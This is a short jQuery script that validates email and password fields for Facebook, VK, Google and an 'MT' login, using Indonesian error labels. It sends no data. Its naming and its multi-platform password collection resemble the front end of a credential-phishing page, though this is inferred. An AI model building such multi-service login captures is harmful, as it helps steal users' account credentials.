function AlexHostingNetFB() {
  $emailfb = $('#alx_email_fb').val().trim();
  $passwordfb = $('#alx_password_fb').val().trim();
  if ($emailfb == '' || $emailfb == null || $emailfb.length <= 5) {
    $('.email-fb').show();
    $('.sandi-fb').hide();
    return false;
  } else {
    $('.email-fb').hide();
  }
  if ($passwordfb == '' || $passwordfb == null || $passwordfb.length <= 5) {
    $('.sandi-fb').show();
    return false;
  } else {
    $('.sandi-fb').hide();
  }
}

function AlexHostingNetVK() {
  $emailvk = $('#alx_email_vk').val().trim();
  $passwordvk = $('#alx_password_vk').val().trim();
  if ($emailvk == '' || $emailvk == null || $emailvk.length <= 5) {
    $('.email-vk').show();
    $('.sandi-vk').hide();
    return false;
  } else {
    $('.email-vk').hide();
  }
  if ($passwordvk == '' || $passwordvk == null || $passwordvk.length <= 5) {
    $('.sandi-vk').show();
    return false;
  } else {
    $('.sandi-vk').hide();
  }
}

function AlexHostingNetGP() {
  $emailgp = $('#alx_email_gp').val().trim();
  $passwordgp = $('#alx_password_gp').val().trim();
  if ($emailgp == '' || $emailgp == null || $emailgp.length <= 5) {
    $('.email-gp').show();
    $('.sandi-gp').hide();
    return false;
  } else {
    $('.email-gp').hide();
  }
  if ($passwordgp == '' || $passwordgp == null || $passwordgp.length <= 5) {
    $('.sandi-gp').show();
    return false;
  } else {
    $('.sandi-gp').hide();
  }
}

function AlexHostingNetMT() {
  $emailmt = $('#alx_email_mt').val().trim();
  $passwordmt = $('#alx_password_mt').val().trim();
  if ($emailmt == '' || $emailmt == null || $emailmt.length <= 5) {
    $('.email-mt').show();
    $('.sandi-mt').hide();
    return false;
  } else {
    $('.email-mt').hide();
  }
  if ($passwordmt == '' || $passwordmt == null || $passwordmt.length <= 5) {
    $('.sandi-mt').show();
    return false;
  } else {
    $('.sandi-mt').hide();
  }
}
